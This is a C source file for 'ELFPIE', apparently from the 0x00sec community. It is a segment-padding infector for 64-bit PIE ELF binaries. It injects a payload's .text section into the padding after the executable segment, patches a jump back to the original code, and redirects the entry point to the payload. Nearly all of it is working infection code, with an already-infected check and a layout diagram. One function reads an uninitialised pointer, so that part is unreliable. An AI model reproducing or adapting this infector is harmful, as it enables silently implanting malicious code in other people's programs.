/*
  ELFPIE
  Copyright (c) 2019 picoFlamingo

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

/*************************************************************
  Read the post at 0x00sec.org... Maybe Some day :)
  
**********************************************************************/

/* Segment padding infection */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>

#include <elf.h>
#include <sys/mman.h>

/* Helper functions */
static int 
get_file_size (int fd)
{
  struct stat _info;
  
  fstat (fd, &_info);

  return _info.st_size;
}

/* Open a file and map it in memory for easy update */
int
elfi_open_and_map (char *fname, void **data, int *len)
{
  int   size;
  int   fd;
  
  if ((fd = open (fname, O_APPEND | O_RDWR, 0)) < 0)
    {
      perror ("open:");
      exit (1);
    }
  
  size = get_file_size (fd);
  if ((*data = mmap (0, size, PROT_READ| PROT_WRITE| PROT_EXEC,
		    MAP_SHARED, fd, 0)) == MAP_FAILED)
    {
      perror ("mmap:");
      exit (1);
    }
#ifdef DEBUG  
  printf ("+ File mapped (%d bytes ) at %p\n", size, data);
#endif
  
  *len = size;
  return fd;
}


#ifdef DEBUG
/* Debug function to dump registers */
void
elfi_dump_segments (void *d)
{
  Elf64_Ehdr* elf_hdr = (Elf64_Ehdr *) d;
  Elf64_Phdr* elf_seg;
  int         n_seg = elf_hdr->e_phnum;
  int         i;
  
  elf_seg = (Elf64_Phdr *) ((unsigned char*) elf_hdr 
			    + (unsigned int) elf_hdr->e_phoff);
  for (i = 0; i < n_seg; i++)
    {    
      printf (" [INFO] Segment %d: Type: %8x (%x) Offset: %8x "
	      "FSize:%8x MSize:%8x\n",
	      i, elf_seg->p_type, elf_seg->p_flags, 
	      (unsigned int)elf_seg->p_offset, 
	      (unsigned int)elf_seg->p_filesz, 
	      (unsigned int)elf_seg->p_memsz);
      
      elf_seg = (Elf64_Phdr *) ((unsigned char*) elf_seg 
				+ (unsigned int) elf_hdr->e_phentsize);
    }
  
}
#endif


Elf64_Phdr*
elfi_find_gap (void *d, int fsize, int *p, int *len)
{
  Elf64_Ehdr* elf_hdr = (Elf64_Ehdr *) d;
  Elf64_Phdr* elf_seg, *text_seg;
  int         n_seg = elf_hdr->e_phnum;
  int         i;
  int         text_end, gap=fsize;
  
  elf_seg = (Elf64_Phdr *) ((unsigned char*) elf_hdr 
			    + (unsigned int) elf_hdr->e_phoff);
  
  for (i = 0; i < n_seg; i++)
    {
      if (elf_seg->p_type == PT_LOAD && elf_seg->p_flags & 0x011)
	{
#ifdef DEBUG	  
	  printf ("+ Found .text segment (#%d)\n", i);
#endif
	  text_seg = elf_seg;
	  text_end = elf_seg->p_offset + elf_seg->p_filesz;
	}
      else
	{
	  if (elf_seg->p_type == PT_LOAD && 
	      (elf_seg->p_offset - text_end) < gap) 
	    {
#ifdef DEBUG	      
	      printf ("   * Found LOAD segment (#%d) close to .text (offset: 0x%x)\n",
		      i, (unsigned int)elf_seg->p_offset);
#endif
	      gap = elf_seg->p_offset - text_end;
	    }
	}
      elf_seg = (Elf64_Phdr *) ((unsigned char*) elf_seg 
				+ (unsigned int) elf_hdr->e_phentsize);
    }
  
  *p = text_end;
  *len = gap;
  
  printf ("+ .text segment gap at offset 0x%x(0x%x bytes available)\n", text_end, gap);
  
  return text_seg;
}


Elf64_Shdr *
elfi_find_section (void *data, char *name)
{
  char        *sname;
  int         i;
  Elf64_Ehdr* elf_hdr = (Elf64_Ehdr *) data;
  Elf64_Shdr *shdr = (Elf64_Shdr *)(data + elf_hdr->e_shoff);
  Elf64_Shdr *sh_strtab = &shdr[elf_hdr->e_shstrndx];
  const char *const sh_strtab_p = data + sh_strtab->sh_offset;
  
#ifdef DEBUG  
  printf ("+ %d section in file. Looking for section '%s'\n", 
	  elf_hdr->e_shnum, name);
#endif  
  
  for (i = 0; i < elf_hdr->e_shnum; i++)
    {
      sname = (char*) (sh_strtab_p + shdr[i].sh_name);
      if (!strcmp (sname, name))  return &shdr[i];
    }
  
  return NULL;
}


int
elfi_find_symbol (void *data, char*name)
{
  Elf64_Ehdr* elf_hdr = (Elf64_Ehdr *) data;
  Elf64_Shdr* s;
  Elf64_Shdr *shdr = (Elf64_Shdr *)(data + elf_hdr->e_shoff);
  char       *sh_strtab_p = (char *)(data + shdr[s->sh_link].sh_offset);
  char       *sh_symtab_p = data + s->sh_offset;
  Elf64_Sym  *symbol;
  int        n_entries, i;
  
  if ((s = elfi_find_section (data, ".symtab")) == NULL)
    {
      fprintf (stderr, "Cannot find symtable\n");
      return -1;
    }

  n_entries = s->sh_size / s->sh_entsize;
  shdr = (Elf64_Shdr *)(data + elf_hdr->e_shoff);
  sh_strtab_p = (char *)(data + shdr[s->sh_link].sh_offset);
  sh_symtab_p = data + s->sh_offset;

  for (i = 0; i < n_entries; i++)
    {
      symbol = &((Elf64_Sym *)sh_symtab_p)[i];
      if (symbol->st_name)
	{
	  if (!strcmp (sh_strtab_p + symbol->st_name, name))
	    return symbol->st_value;
	}
    }

  return -1;
}


int
main (int argc, char *argv[])
{
  void        *d, *d1;
  int         target_fd, payload_fd;
  int         fsize, fsize1;
  Elf64_Ehdr* elf_hdr;
  Elf64_Phdr  *t_text_seg;
  Elf64_Shdr  *p_text_sec;
  Elf64_Addr  base, ep, nep, _label;
  int         p, len;

  printf ("Segment Padding Infector for 0x00sec\nPIE-Edition\nby pico\n\n");
  if (argc != 3)
    {
      fprintf (stderr, "Usage:\n  %s elf_file payload\n", argv[0]);
      exit (1);
    }
  
  /* Open and map target ELF */
  target_fd = elfi_open_and_map (argv[1], &d, &fsize);
  
  /* Get Application Entry point */
  elf_hdr = (Elf64_Ehdr *) d;
  ep = elf_hdr->e_entry;
  printf ("+ Target Entry point: %p\n", (void*) ep);
  if (elf_hdr->e_type != ET_DYN)
    {
      printf ("+ Target is not a PIE binary.... Aborting\n");
      goto clean_and_exit1;
    }
  
#ifdef DEBUG  
  elfi_dump_segments (d);
#endif
  
  /* Find executable segment and obtain offset and gap size */
  t_text_seg = elfi_find_gap (d, fsize, &p, &len);
  base = t_text_seg->p_vaddr;
  
  /* Process payload */
  payload_fd = elfi_open_and_map (argv[2], &d1, &fsize1);
  p_text_sec = elfi_find_section (d1, ".text");
  
  /* XXX: Looks like we do not really have to patch the segment sizes */
  /*
    t_text_seg->p_filesz += p_text_sec->sh_size;
    t_text_seg->p_memsz += p_text_sec->sh_size;
  */
  
  printf ("+ Payload .text section found at %lx (%lx bytes)\n", 
	  p_text_sec->sh_offset, p_text_sec->sh_size);
  
  if (p_text_sec->sh_size > len)
    {
      fprintf (stderr, "- Payload to big, cannot infect file.\n");
      goto clean_and_exit2;
    }
  
  /* before copying... Let's check if the file has already been infected */
  if (!memcmp (d + p, d1 + p_text_sec->sh_offset, 24))
    {
      fprintf (stderr, "!! This file has already been infected... \n");
      goto clean_and_exit2;
    }

  /* Calculate offset to original entry point*/ 
  nep = ((Elf64_Ehdr*) d1)->e_entry;
  
  printf ("+ Payload Entry point    : %lx\n", nep);
  
  _label = elfi_find_symbol (d1, "_label");
  printf ("+ _label symbol found at : 0x%lx\n", _label);
  
  _label += (1 - nep);
  printf ("+ Payload jump offset    : %lx\n", _label);
  printf ("+ Final jump offset      : %lx\n", _label + p); 

  nep = - (_label + p - ep) - 4;
  printf ("+ Adjust offset to patch : %x\n", (uint32_t)nep);
  
  /* Copy payload in the segment padding area */
  memmove (d + p, d1 + p_text_sec->sh_offset, p_text_sec->sh_size);
  
  /* Patch return address */
  memmove (d + p + _label, &nep, sizeof(uint32_t));
  
  /* Patch entry point */
  elf_hdr->e_entry = (Elf64_Addr) (base + p);
  
  /* Close files and actually update target file */
 clean_and_exit2:
  close (payload_fd);
 clean_and_exit1:
  
  close (target_fd);
  
  return 0;
}


/*
 Cool ASCII-Art

0x0000   +-------------+   +-------------+
         | Text        |   | Text        |
         |             |   |             |
ep       | entry_point |   | entry_point |<---+
         |             |   |             |    |  RIP points to next instruction --+
p        +-------------+   +-------------+    |                                   |
         | GAP         |   | Payload     |    | - ((_label+1-nep) + p - ep) + 4 <-+
_label   |             |   | _label:     |    |     ^ 
         |             |   |    jmp ep   |----+     +--- offset calculated from 
gap+size +-------------+   + ------------+               payload file
         | Data        |   | Data        |
         +-------------+   +-------------+
         | Other       |   | Other       |
         \/\/\/\/\/\/\/    \/\/\/\/\/\/\/

 */
